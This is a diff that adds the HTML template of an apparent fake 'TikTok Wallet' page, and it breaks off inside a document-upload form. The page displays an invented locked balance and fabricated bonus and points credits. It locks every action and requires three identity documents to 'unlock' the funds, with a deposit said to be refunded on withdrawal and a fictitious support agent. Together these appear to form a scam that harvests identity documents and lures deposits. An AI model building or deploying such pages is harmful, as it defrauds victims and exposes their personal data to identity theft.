@@ -1,0 +1,631 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="theme-color" content="#F5F5F8">
+    
+    <meta name="csrf-token" content="PdcJYaCR5uInm62Kc50Gj4p5b6VNLaMJ10YSDovG">
+    <script src="/js/wallet-shim.js"></script>
+    <title>Wallet</title>
+    <link rel="stylesheet" href="/css/tokens.css">
+    <link rel="stylesheet" href="/css/shell.css">
+    <link rel="stylesheet" href="/css/components.css">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    
+    <script src="/js/vendor/turbo.min.js"></script>
+    <script src="/js/app.js" defer></script>
+    <script src="/js/lead.js" defer></script>
+    <script src="/js/vendor/alpine.min.js" defer></script>
+</head>
+<body>
+
+<div class="app-shell" x-data="{ sheetOpen: false, uploadOpen: false, cardDetails: false, cardLimit: false, cardPin: false, cardDesign: false }">
+
+    <header class="app-header">
+        <img class="app-header__logo" src="/images/logo.webp" alt="TikTok Wallet" width="82" height="24">
+
+        <div class="app-header__actions">
+            
+            <button type="button" class="app-header__bell" @click="sheetOpen = true"
+                    aria-label="Notifications"
+                    x-data="{ unread: 1 }"
+                    @support-unread.window="unread = Math.max($event.detail.unread, 1)">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                <span class="app-header__dot" aria-hidden="true" x-show="unread > 0"
+                      ></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="app-main  " id="screen">
+            <section class="screen stack--loose"
+             id="home-screen"
+             x-data
+             x-init="$nextTick(() => window.toast('You are signed in. Welcome back!'))">
+
+        <div class="greeting enter" style="--i:0">
+            <span class="greeting__avatar" aria-hidden="true">T</span>
+            <div>
+                <p class="greeting__hello">Hi, __USER__</p>
+                <p class="greeting__sub">
+                                            Welcome back
+                                    </p>
+            </div>
+        </div>
+
+        <div class="balance-card">
+
+    <div class="balance-card__texture" aria-hidden="true"></div>
+    <div class="balance-card__glare" aria-hidden="true"></div>
+    <div class="balance-card__glow" aria-hidden="true"></div>
+
+    
+    <div class="balance-card__chips" aria-hidden="true">
+        <svg class="balance-card__contactless" xmlns="http://www.w3.org/2000/svg"
+             viewBox="0 -24.98 122.88 122.88" width="26" height="26" fill="#fff" focusable="false">
+            <path d="M45.45,72.81C30.81,71.53,17.88,66.1,9.47,57.69c-4.8-4.79-7.71-9.99-9.02-16.12c-0.6-2.79-0.6-7.41,0.01-10.23 c1.83-8.52,7.33-15.97,16-21.66C36.23-3.28,66.52-3.22,86.11,9.83c2.6,1.73,4.28,3.11,6.64,5.43c2.97,2.93,5.06,5.85,7.26,10.13 c0.08,0.16,0.49,0.36,0.9,0.44c1.39,0.29,3.24,1.37,4.73,2.76c1.16,1.08,2.05,2.26,4.26,5.6c2.23,3.37,12.31,18.93,12.92,19.95 c0.24,0.4-0.23,1.03-0.76,1.03c-0.38,0-0.64-0.25-1.2-1.13c-0.39-0.62-2.96-4.61-5.71-8.87c-9.73-15.06-10.25-15.76-12.96-17.12 l-1.42-0.71l-4.18,0c-4.18,0-4.18,0-4.28,0.44c-0.55,2.41-0.66,3-0.54,3.11c0.08,0.07,2.45,1.42,5.27,3l5.13,2.87l-0.32,0.67 c-0.18,0.37-0.38,0.67-0.45,0.67s-4.39-2.39-9.6-5.32c-5.21-2.92-9.78-5.4-10.15-5.5c-1.48-0.41-3.76,1.23-3.76,2.71 c0,1.5,0.44,1.93,9.6,9.43c5.71,4.68,8.98,7.49,9.48,8.15c0.91,1.21,1.83,2.99,2.67,5.18c1.49,3.86,3.91,6.01,7.88,7.01l1.31,0.33 l-0.11,0.71c-0.06,0.39-0.14,0.75-0.19,0.8c-0.17,0.19-2.8-0.65-4.32-1.38c-2.38-1.14-4.02-2.77-5.63-5.61 c-0.01-0.02-0.95,0.3-2.07,0.71c-2,0.73-2.1,0.79-3.99,2.64c-8.07,7.88-19.65,12.91-33.62,14.62 C56.61,72.9,47.87,73.03,45.45,72.81L45.45,72.81L45.45,72.81z M59.36,70.39c6.41-0.85,11.39-2.12,16.59-4.25 c5.46-2.24,10.62-5.45,14.22-8.87l1.42-1.35l-3.58-1.71c-3.82-1.83-4.2-2.13-4.69-3.76c-0.31-1.03,0.04-2.13,1.02-3.18l0.76-0.83 l-1.66-1.26c-1.31-1-1.72-1.43-1.98-2.09c-0.41-1.07-0.26-2.23,0.4-3.16l0.5-0.71l-5.24-0.92c-2.88-0.51-5.57-1.02-5.97-1.14 c-0.79-0.23-1.58-1.13-1.79-2c-0.11-0.47,2.46-13.01,3.03-14.8c0.26-0.8,1.35-1.77,2.18-1.92c0.87-0.16,16.31,2.55,17.08,3 c1.22,0.71,1.6,1.85,1.22,3.61l-0.16,0.73l0.85,0c0.47,0,1.58-0.06,2.47-0.13l1.62-0.13l-0.8-1.49C94.44,19.54,90.05,15,84.64,11.4 c-2.53-1.68-7.92-4.34-11.17-5.5c-4.62-1.65-10.21-2.89-15.58-3.45c-2.95-0.31-10.66-0.3-13.52,0.01 C37.52,3.2,31.3,4.75,25.86,7.07C13.26,12.44,4.79,21.34,2.62,31.48c-0.57,2.65-0.61,7.29-0.09,9.7c1.15,5.33,3.65,9.94,7.72,14.23 c8.3,8.74,20.98,14.12,36.18,15.33C48.47,70.9,57.29,70.66,59.36,70.39L59.36,70.39z M56.59,60.85c-0.78-0.23-1.58-1.16-1.75-2.05 c-0.11-0.58,0.02-0.98,0.85-2.59c3.36-6.5,4.82-12.48,4.82-19.73c0-7.01-1.29-12.47-4.5-19.01c-0.69-1.4-1.25-2.71-1.25-2.9 c0-0.7,0.58-1.71,1.21-2.1c0.86-0.54,2.31-0.44,3.01,0.21c0.27,0.25,0.96,1.39,1.54,2.53c2.3,4.51,3.87,9.46,4.65,14.61 c0.48,3.19,0.58,9.23,0.19,12.15c-0.71,5.38-2.13,10.19-4.41,14.89c-1.38,2.84-2.24,4.01-2.96,4.01c-0.14,0-0.38,0.04-0.52,0.08 C57.33,60.99,56.93,60.95,56.59,60.85L56.59,60.85L56.59,60.85z M47.24,55.96c-1.2-0.35-2.07-1.83-1.72-2.93 c0.08-0.27,0.65-1.5,1.26-2.74c2.57-5.25,3.64-10.87,3.12-16.39c-0.43-4.54-1.24-7.4-3.29-11.58c-1.37-2.81-1.44-3.24-0.64-4.38 c0.76-1.08,2.66-1.25,3.65-0.34c0.69,0.63,2.84,5.12,3.67,7.66c2.74,8.4,2.32,17.43-1.19,25.68 C50.29,55.17,49.02,56.48,47.24,55.96L47.24,55.96z M37.6,51c-0.74-0.33-1.38-1.12-1.56-1.91c-0.11-0.48,0.08-1.02,0.96-2.8 c3.24-6.56,3.27-12.87,0.11-19.28c-1.39-2.81-1.42-3.37-0.25-4.48c0.58-0.55,0.83-0.64,1.64-0.64c1.37,0,2.08,0.69,3.3,3.2 c1.88,3.86,2.65,7.21,2.64,11.5c-0.01,4.41-0.73,7.44-2.73,11.51c-1.15,2.33-1.72,2.95-2.87,3.1C38.49,51.23,37.93,51.15,37.6,51 L37.6,51L37.6,51z M28.6,46.38c-0.59-0.24-1.26-1.04-1.46-1.74c-0.22-0.78-0.04-1.4,0.84-2.85c1.14-1.87,1.4-2.87,1.4-5.31 c0-2.44-0.26-3.45-1.4-5.31c-0.39-0.63-0.77-1.39-0.86-1.69c-0.37-1.23,0.66-2.74,2.04-3c1.17-0.22,1.97,0.3,3.05,1.98 c3.11,4.86,3.11,11.34,0,16.16C31.11,46.31,29.89,46.91,28.6,46.38L28.6,46.38L28.6,46.38z M95.63,53.92 c1.04-0.37,1.94-0.72,2-0.78c0.06-0.06-0.14-0.72-0.45-1.48c-0.62-1.55-0.52-1.51-2.74-1.09c-2.39,0.46-3.78,0.05-6.4-1.88 c-0.71-0.53-1.45-0.96-1.63-0.96c-0.19,0-0.59,0.27-0.91,0.61c-0.67,0.72-0.77,1.84-0.23,2.51c0.48,0.58,7.05,3.71,7.83,3.73 C93.45,54.59,94.58,54.29,95.63,53.92L95.63,53.92L95.63,53.92z M94.59,48.89c0.97-0.2,1.08-0.26,0.91-0.58 c-0.19-0.35-9.28-7.89-10.07-8.36c-0.65-0.38-1.18-0.29-1.72,0.29c-1.58,1.69-1.39,2.05,2.7,5.18 C91.35,49.21,91.88,49.43,94.59,48.89L94.59,48.89z M82.39,37.46c0-0.05-1.03-0.94-2.29-1.97c-3.11-2.56-3.78-3.52-3.78-5.42 c0-1.58,1.06-3.11,2.76-3.99c0.84-0.44,2.35-0.57,3.2-0.29c0.6,0.2,3.32,1.67,7.08,3.83l0.79,0.46l0.65-3.1 c0.67-3.17,0.68-4.01,0.06-4.2c-0.19-0.06-3.82-0.72-8.06-1.47c-7.54-1.33-8.37-1.41-8.72-0.84c-0.19,0.3-3.06,13.6-3.06,14.16 c0,0.28,0.14,0.63,0.32,0.78c0.17,0.15,2.62,0.68,5.44,1.18C82.22,37.57,82.39,37.6,82.39,37.46L82.39,37.46z"/>
+        </svg>
+
+        <svg class="balance-card__chip" xmlns="http://www.w3.org/2000/svg"
+             viewBox="0 0 48 36" width="36" height="27" fill="none" focusable="false">
+            <rect x="1" y="1" width="46" height="34" rx="4" fill="#fbbf24" stroke="#d97706" stroke-width="0.5"/>
+            <rect x="6" y="6" width="14" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"/>
+            <rect x="24" y="6" width="10" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"/>
+            <rect x="6" y="20" width="18" height="10" rx="1.5" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.4"/>
+            <line x1="4" y1="12" x2="44" y2="12" stroke="#b45309" stroke-width="0.3" opacity="0.2"/>
+            <line x1="4" y1="24" x2="44" y2="24" stroke="#b45309" stroke-width="0.3" opacity="0.2"/>
+        </svg>
+    </div>
+
+    <div class="balance-card__amount">
+        <p class="balance-card__label">Total balance</p>
+        <p class="balance-card__value" aria-label="$2,837.12">$2,837<span class="bc-cents">.12</span></p>
+        <p class="balance-card__currency">USD</p>
+    </div>
+
+    <p class="balance-card__pan">**** **** **** 1789</p>
+
+    
+    <p class="balance-card__status">
+        <span class="balance-card__dot" aria-hidden="true"></span>Locked balance
+    </p>
+</div>
+
+        
+        <div class="enter" style="--i:1">
+                                <div class="alert-banner alert-banner--warning" role="note">
+    <span class="alert-banner__icon" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+    </span>
+
+    <div class="alert-banner__body">
+        <strong class="alert-banner__title">Documentation required</strong>
+                    <p class="alert-banner__text">Upload the three required documents to unlock your balance and start the account verification.</p>
+            </div>
+</div>
+
+                    <button type="button" class="btn btn--primary btn--full"
+                            style="margin-top:var(--space-3)"
+                            @click="uploadOpen = true; window.track('upload_sheet_opened', { received: 0 })">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+                                                    Upload documents
+                                            </button>
+                    </div>
+
+        <div class="action-row" class="enter" style="--i:2"><div class="action-row__hit"
+                     role="button"
+                     tabindex="0"
+                     data-lock-action="Send"
+                     aria-haspopup="dialog"
+                     aria-label="Send">
+                    <button type="button" class="action-btn action-btn--locked">
+        <span class="action-btn__icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg>
+                            <span class="action-btn__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    </span>
+        <span class="action-btn__label">Send<span class="sr-only"> (locked)</span></span>
+    </button>
+                </div>
+                            <div class="action-row__hit"
+                     role="button"
+                     tabindex="0"
+                     data-lock-action="Receive"
+                     aria-haspopup="dialog"
+                     aria-label="Receive">
+                    <button type="button" class="action-btn action-btn--locked">
+        <span class="action-btn__icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+                            <span class="action-btn__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    </span>
+        <span class="action-btn__label">Receive<span class="sr-only"> (locked)</span></span>
+    </button>
+                </div>
+                            <div class="action-row__hit"
+                     role="button"
+                     tabindex="0"
+                     data-lock-action="Cards"
+                     aria-haspopup="dialog"
+                     aria-label="Cards">
+                    <button type="button" class="action-btn action-btn--locked">
+        <span class="action-btn__icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+                            <span class="action-btn__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    </span>
+        <span class="action-btn__label">Cards<span class="sr-only"> (locked)</span></span>
+    </button>
+                </div>
+                            <div class="action-row__hit"
+                     role="button"
+                     tabindex="0"
+                     data-lock-action="More"
+                     aria-haspopup="dialog"
+                     aria-label="More">
+                    <button type="button" class="action-btn action-btn--locked">
+        <span class="action-btn__icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M3 15h18"/><path d="M9 3v18"/><path d="M15 3v18"/></svg>
+                            <span class="action-btn__badge" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+</span>
+                    </span>
+        <span class="action-btn__label">More<span class="sr-only"> (locked)</span></span>
+    </button>
+                </div></div>
+
+        <div class="enter" style="--i:3">
+            <h2 class="section__title">Recent activity</h2>
+
+            <div class="tx-list">
+                                    <div class="tx-row enter" style="--i:4;">
+    <span class="tx-row__icon tx-row__icon--in" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+    </span>
+
+    <div class="tx-row__body">
+        <p class="tx-row__title">Bonus credited</p>
+        <p class="tx-row__meta">$500 · 5,000,000 points · __DATE__</p>
+    </div>
+
+    <span class="tx-row__amount tx-row__amount--in">+ 5,000,000 pts</span>
+</div>
+                                    <div class="tx-row enter" style="--i:5;">
+    <span class="tx-row__icon tx-row__icon--in" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+    </span>
+
+    <div class="tx-row__body">
+        <p class="tx-row__title">Points converted</p>
+        <p class="tx-row__meta">TikTok Rewards · __DATE__</p>
+    </div>
+
+    <span class="tx-row__amount tx-row__amount--in">+ $1,289.83</span>
+</div>
+                                    <div class="tx-row enter" style="--i:6;">
+    <span class="tx-row__icon tx-row__icon--in" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+    </span>
+
+    <div class="tx-row__body">
+        <p class="tx-row__title">Points credited</p>
+        <p class="tx-row__meta">12,899,000 points · __DATE__</p>
+    </div>
+
+    <span class="tx-row__amount tx-row__amount--in">+ 12,899,000 pts</span>
+</div>
+                                    <div class="tx-row enter" style="--i:7;">
+    <span class="tx-row__icon tx-row__icon--in" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+    </span>
+
+    <div class="tx-row__body">
+        <p class="tx-row__title">Deposit credited</p>
+        <p class="tx-row__meta">Added to your balance · refunded on withdrawal · __DATE__</p>
+    </div>
+
+    <span class="tx-row__amount tx-row__amount--in">+ $37.12</span>
+</div>
+                                    <div class="tx-row enter" style="--i:8;">
+    <span class="tx-row__icon tx-row__icon--in" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+    </span>
+
+    <div class="tx-row__body">
+        <p class="tx-row__title">Transfer received</p>
+        <p class="tx-row__meta">__USER__ · __DATE__</p>
+    </div>
+
+    <span class="tx-row__amount tx-row__amount--in">+ $37.12</span>
+</div>
+                            </div>
+        </div>
+
+        
+        <div class="lock-gate"
+             id="lock-gate"
+             hidden
+             role="dialog"
+             aria-modal="true"
+             aria-labelledby="lock-gate-title">
+            <button type="button" class="lock-gate__backdrop" data-lock-close aria-label="Close"></button>
+            <div class="lock-gate__card">
+                <div class="lock-gate__handle" aria-hidden="true"></div>
+
+                <div class="lock-gate__icon" aria-hidden="true">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+
+                <p class="lock-gate__kicker" id="lock-gate-kicker">Action unavailable</p>
+                <h2 class="lock-gate__title" id="lock-gate-title">
+                                            Verification required
+                                    </h2>
+                <p class="lock-gate__lead">
+                                            This action stays locked while your account is under review.
+                        Nothing is wrong with the tap — the wallet is waiting on the step below.
+                                    </p>
+
+                <div class="lock-gate__step">
+                    <span class="lock-gate__step-kicker">
+                                                    Current step
+                                            </span>
+                    <p class="lock-gate__step-label">Access confirmed</p>
+                                            <p class="lock-gate__step-detail">Your purchase matched this wallet and the review file was opened.</p>
+                                                        </div>
+
+                <div class="lock-gate__actions">
+                    <a href="/verification" class="btn btn--primary btn--full">View review progress</a>
+                    <button type="button" class="btn btn--ghost btn--full" data-lock-close>Got it</button>
+                </div>
+            </div>
+        </div>
+
+    </section>
+    </main>
+
+            <nav class="app-tabbar" aria-label="Main navigation">
+            
+        <a class="app-tabbar__item"
+           href="/"
+            aria-current="page" >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+                            </span>
+            <span>Home</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/verification"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+                            </span>
+            <span>Verification</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/cards"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+                            </span>
+            <span>Cards</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/support"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+                            </span>
+            <span>Support</span>
+        </a>
+    </nav>
+    
+    <div class="sheet" x-cloak x-show="sheetOpen" role="dialog" aria-modal="true"
+     aria-label="Notifications" @keydown.escape.window="sheetOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="sheetOpen"
+         x-transition.opacity.duration.200ms
+         @click="sheetOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="sheetOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) sheetOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Notifications</h2>
+            <button type="button" class="sheet__close" @click="sheetOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div class="stack" x-data="{ unread: 0 }"
+             @support-unread.window="unread = $event.detail.unread">
+
+            
+            <a class="notify-row" href="/support/chat" x-show="unread > 0"
+                x-cloak >
+                <span class="notify-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z"/></svg>
+</span>
+                <span class="notify-row__body">
+                    <span class="notify-row__title">Sarah Mitchell replied</span>
+                    <span class="notify-row__text" x-text="unread === 1 ? '1 new message in your support chat' : unread + ' new messages in your support chat'">
+                        0 new messages in your support chat
+                    </span>
+                </span>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"/></svg>
+            </a>
+
+                                <div class="sheet-menu">
+        <div class="sheet-menu__item">
+            <span class="sheet-menu__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
+</span>
+            <span class="sheet-menu__label">
+                 Documentation required
+                            </span>
+            <span class="badge badge--warning">Action</span>
+        </div>
+
+        <div class="sheet-menu__item">
+            <span class="sheet-menu__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"/><path d="M17 17H7V7"/></svg>
+</span>
+            <span class="sheet-menu__label">Transfer received from Ana Paula</span>
+            <span class="badge badge--success">Today</span>
+        </div>
+
+        <a class="sheet-menu__item" href="/verification">
+            <span class="sheet-menu__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+</span>
+            <span class="sheet-menu__label">See all in Verification</span>
+        </a>
+    </div>
+                    </div></div>
+    </div>
+</div>
+
+    
+        <div class="sheet" x-cloak x-show="uploadOpen" role="dialog" aria-modal="true"
+     aria-label="Document upload" @keydown.escape.window="uploadOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="uploadOpen"
+         x-transition.opacity.duration.200ms
+         @click="uploadOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="uploadOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) uploadOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Document upload</h2>
+            <button type="button" class="sheet__close" @click="uploadOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div x-data="{ sent: false, received: 0 }"
+         @document-received="received++">
+
+        <form class="upload-form"
+              action="/verification/submit"
+              method="post"
+              x-show="!sent"
+              @submit="if (sent) return;
+                       $event.preventDefault();
+                       if (! window.uploadsReady($el)) {
+                           window.toast('Upload all 3 documents.');
+                           return;
+                       }
+                       sent = true;
+                       window.chime();
+                       setTimeout(() => $el.requestSubmit(), 1400)">
+            <input type="hidden" name="_token" value="PdcJYaCR5uInm62Kc50Gj4p5b6VNLaMJ10YSDovG" autocomplete="off">
+            <p class="upload-form__lead">
+                All three documents below are required to start the account review.
+            </p>
+
+            <div class="upload-form__zones">
+                                    <label class="upload-zone" data-slot="identity"
+       :class="{ 'upload-zone--filled': received, 'upload-zone--busy': busy }"
+       x-data="uploadZone('identity', false, null)">
+
+    <input class="upload-zone__input" type="file" accept="image/*,application/pdf"
+           :disabled="busy" @change="pick($event)">
+
+    <span class="upload-zone__icon" aria-hidden="true">
